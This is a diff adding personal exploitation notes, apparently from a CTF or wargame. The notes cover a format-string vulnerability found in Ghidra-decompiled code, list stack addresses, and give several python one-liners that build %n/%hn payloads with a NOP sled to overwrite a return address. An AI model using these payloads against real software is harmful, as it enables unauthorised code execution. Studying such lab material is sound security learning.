@@ -1,0 +1,34 @@
+
+/***********************************/
+/*	Ghidra decompiler          */
+/***********************************/
+
+/************/
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+
+/************/
+
+Strat 1:
+-> write shellcode in 520 buffer and overwrite eip to buffer address
+
+/***********************************/
+/*	  Informations             */
+/***********************************/
+
+stack string offset pointer = 4
+
+$ebp -> 0xbffff728:	0xbffff738
+$eip -> 0xbffff72c:	0x0804850f
+
+python -c 'print "\x2c\xf7\xff\xbf" + "\x2d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n"'
+
+NOP -> 0xbffff550
+
+f550 = 62800d
+bfff = 49151d
+python -c 'print "\x2c\xf7\xff\xbf" + "\x2d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n"'
+r < <(python -c 'print "\x4c\xf7\xff\xbf" + "\x4d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n" + "a"*10 + "%5$hn"')
+
